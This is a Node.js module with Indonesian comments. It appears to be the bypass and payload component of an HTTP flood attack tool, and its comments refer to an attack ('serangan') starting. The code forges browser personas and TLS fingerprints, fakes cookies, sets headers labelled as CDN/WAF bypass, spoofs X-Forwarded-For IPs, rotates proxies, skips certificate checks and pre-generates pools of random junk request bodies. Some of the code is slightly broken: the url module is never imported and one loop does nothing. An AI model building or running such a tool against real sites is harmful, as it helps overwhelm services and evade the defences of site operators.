const crypto = require('crypto');
const { URLSearchParams } = require('url');

// Daftar proxy yang akan digunakan.
// Proxy buatan sendiri akan ditambahkan ke daftar ini secara otomatis saat serangan dimulai.
const proxyList = [];

// --- Sistem Persona Browser ---
// Setiap persona menggabungkan User-Agent, Client-Hints, dan profil TLS yang konsisten.
const browserPersonas = [
    {
        id: 'chrome_124',
        ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        sec_ch_ua: '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        platform: '"Windows"'
    },
    {
        id: 'firefox_125',
        ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0',
        // Firefox tidak mengirim Sec-CH-UA, jadi kita biarkan kosong.
    },
    {
        id: 'safari_17_2',
        ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15',
    },
    {
        id: 'chrome_120',
        ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        sec_ch_ua: '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        platform: '"macOS"'
    }
];

// Daftar referer yang lebih beragam untuk bypass
const referers = [
    "https://www.google.com/",
    "https://www.facebook.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.instagram.com/",
    "https://www.twitter.com/",
];

// Helper untuk memilih item acak dari array
const randomChoice = (arr) => arr[Math.floor(Math.random() * arr.length)];

const accept_encoding_pool = ['gzip, deflate, br, zstd', 'gzip, deflate, br', 'gzip, deflate'];
const sec_fetch_dest_pool = ['document', 'empty', 'script', 'style', 'image', 'font'];
const device_memory_pool = ['1', '2', '4', '8'];
const viewport_width_pool = ['1920', '1680', '1440', '1366', '2560'];

function populateInitialCookies(cookieJar, targetHost) {
    const sessionId = crypto.randomBytes(16).toString('hex');
    const analyticsId = `GA1.1.${crypto.randomInt(100000000, 999999999)}.${Date.now()}`;
    cookieJar.setCookieSync(`sessionid=${sessionId}; Domain=${targetHost}; Path=/; HttpOnly`, `https://${targetHost}`);
    cookieJar.setCookieSync(`_ga=${analyticsId}; Domain=${targetHost}; Path=/`, `https://${targetHost}`);
}

function getDynamicAcceptHeader(fetchDest) {
    switch (fetchDest) {
        case 'document':
        case 'iframe':
            return 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
        case 'script':
            return '*/*';
        case 'style':
            return 'text/css,*/*;q=0.1';
        case 'image':
            return 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8';
        case 'font':
            return '*/*';
        case 'empty': // Typically for fetch/XHR
            return 'application/json, text/plain, */*';
        default:
            return '*/*';
    }
}

function getBypassOptions(target, cookieJar) {
    // 1. Pilih Persona Browser yang konsisten
    const persona = randomChoice(browserPersonas);
    const headers = {};

    // 2. Simulasi Cookie Pengguna yang Kembali
    if (cookieJar.getCookiesSync(`https://${target.host}`).length === 0) {
        populateInitialCookies(cookieJar, target.host);
    }

    // 3. Atur Header Utama berdasarkan Persona
    headers['user-agent'] = persona.ua;
    if (persona.sec_ch_ua) {
        headers['sec-ch-ua'] = persona.sec_ch_ua;
        headers['sec-ch-ua-mobile'] = '?0';
        headers['sec-ch-ua-platform'] = persona.platform;
    }

    // 4. Atur Header Kontekstual (Sec-Fetch)
    headers['sec-fetch-dest'] = randomChoice(sec_fetch_dest_pool);
    
    let site, mode;
    const siteChoice = Math.random();
    if (siteChoice < 0.5) { site = 'none'; mode = 'navigate'; }
    else if (siteChoice < 0.8) { site = 'same-origin'; mode = 'cors'; }
    else { site = 'cross-site'; mode = 'cors'; }

    headers['sec-fetch-site'] = site;
    headers['sec-fetch-mode'] = mode;
    headers['sec-fetch-user'] = '?1';

    // 5. Atur Header Lainnya secara Dinamis
    headers['accept'] = getDynamicAcceptHeader(headers['sec-fetch-dest']);
    headers['accept-encoding'] = randomChoice(accept_encoding_pool);
    headers['accept-language'] = generateRealisticAcceptLanguage();
    
    // 6. Header Cache-Control Agresif
    headers['cache-control'] = 'no-cache, no-store, must-revalidate, max-age=0';
    headers['pragma'] = 'no-cache';
    headers['expires'] = '0';

    // 7. Header Penyamaran & Sidik Jari Tambahan
    headers['connection'] = 'keep-alive';
    headers['upgrade-insecure-requests'] = '1';
    headers['device-memory'] = randomChoice(device_memory_pool);
    headers['viewport-width'] = randomChoice(viewport_width_pool);
    if (headers['sec-fetch-dest'] === 'empty') {
        headers['x-requested-with'] = 'XMLHttpRequest';
    }

    // 8. Header Bypass CDN/WAF
    headers['cf-visitor'] = `{"scheme":"https"}`;
    headers['x-request-id'] = crypto.randomUUID();

    // 9. Spoofing IP Asal
    headers['x-forwarded-for'] = `${crypto.randomInt(1, 255)}.${crypto.randomInt(0, 255)}.${crypto.randomInt(0, 255)}.${crypto.randomInt(1, 255)}`;
    headers['x-forwarded-proto'] = 'https';

    // 10. Referer & Origin Dinamis (disesuaikan dengan Sec-Fetch-Site)
    switch (site) {
        case 'cross-site':
            headers.referer = randomChoice(referers);
            headers.origin = new url.URL(headers.referer).origin;
            break;
        case 'same-origin':
        case 'same-site':
            headers.referer = `${target.protocol}//${target.host}/${crypto.randomBytes(6).toString('hex')}`;
            headers.origin = `${target.protocol}//${target.host}`;
            break;
        default: // 'none', tidak ada referer atau origin
            delete headers.referer;
            delete headers.origin;
            break;
    }

    const options = {
        headers: headers,
        cookieJar: cookieJar,
        insecureSkipVerify: true,
        timeout: 15000,
        clientIdentifier: persona.id,
    };

    if (proxyList.length > 0) {
        options.proxy = randomChoice(proxyList);
    }

    return options;
}

function generateRealisticAcceptLanguage() {
    const languages = [
        { code: 'en-US', q: 1.0 }, { code: 'en', q: 0.9 },
        { code: 'de', q: 0.8 }, { code: 'fr', q: 0.7 },
        { code: 'es', q: 0.6 }, { code: 'id', q: 0.5 }
    ];
    // Acak urutan dan ambil 2-4 bahasa
    const shuffled = languages.sort(() => 0.5 - Math.random());
    const count = 2 + Math.floor(Math.random() * 3);
    return shuffled.slice(0, count).map(lang => `${lang.code};q=${lang.q}`).join(',');
}

function generateMultipartPayload() {
    const boundary = `----WebKitFormBoundary${crypto.randomBytes(16).toString('hex')}`;
    let payload = '';

    // Simulasi upload file
    payload += `--${boundary}\r\n`;
    payload += `Content-Disposition: form-data; name="file"; filename="${crypto.randomBytes(8).toString('hex')}.jpg"\r\n`;
    payload += `Content-Type: image/jpeg\r\n\r\n`;
    payload += crypto.randomBytes(1024).toString('binary') + '\r\n';

    const fieldCount = 1 + Math.floor(Math.random() * 3); // 1-3 field tambahan
    for (let i = 0; i < fieldCount; i++) {
    }
    payload += `--${boundary}--\r\n`;
    return { payload, boundary };
}

function generateUrlEncodedPayload() {
    const params = new URLSearchParams();
    const fieldCount = 5 + Math.floor(Math.random() * 10); // 5 to 15 fields
    for (let i = 0; i < fieldCount; i++) {
        const key = crypto.randomBytes(4 + Math.floor(Math.random() * 4)).toString('hex'); // key length 4-7
        const value = crypto.randomBytes(10 + Math.floor(Math.random() * 40)).toString('hex'); // value length 10-49
        params.append(key, value);
    }
    return params.toString();
}

function generateComplexJsonPayload() {
    const data = {
        id: crypto.randomUUID(),
        timestamp: Date.now(),
        user: {
            userId: crypto.randomBytes(16).toString('hex'),
            session: crypto.randomBytes(32).toString('hex'),
            attributes: {}
        },
        data: [],
        metadata: {
            source: "synthetic-load-generator",
            traceId: crypto.randomUUID(),
            schemaVersion: "1.2.0",
            clientInfo: {
                type: "web",
                os: ["windows", "macos", "linux"][Math.floor(Math.random()*3)],
                browser: ["chrome", "firefox", "safari"][Math.floor(Math.random()*3)]
            }
        }
    };
    for (let i = 0; i < 25; i++) {
        data.user.attributes[`attr_${i}`] = crypto.randomBytes(20).toString('hex');
        data.data.push({ key: crypto.randomBytes(10).toString('hex'), value: crypto.randomBytes(100).toString('hex') });
    }
    return JSON.stringify(data);
}

const jsonPayloadPool = Array.from({ length: 25 }, generateComplexJsonPayload);
const urlEncodedPayloadPool = Array.from({ length: 25 }, generateUrlEncodedPayload);
const multipartPayloadPool = Array.from({ length: 25 }, generateMultipartPayload);

const getRandomPayload = () => {
    const choice = Math.random();
    if (choice < 0.4) { // 40% JSON
        return {
            payload: randomChoice(jsonPayloadPool),
            contentType: 'application/json'
        };
    } else if (choice < 0.8) { // 40% URL Encoded
        return {
            payload: randomChoice(urlEncodedPayloadPool),
            contentType: 'application/x-www-form-urlencoded'
        };
    } else { // 20% Multipart
        const { payload, boundary } = randomChoice(multipartPayloadPool);
        return {
            payload: payload,
            contentType: `multipart/form-data; boundary=${boundary}`
        };
    }
};

module.exports = {
    proxyList,
    browserPersonas,
    getBypassOptions,
    getRandomPayload
};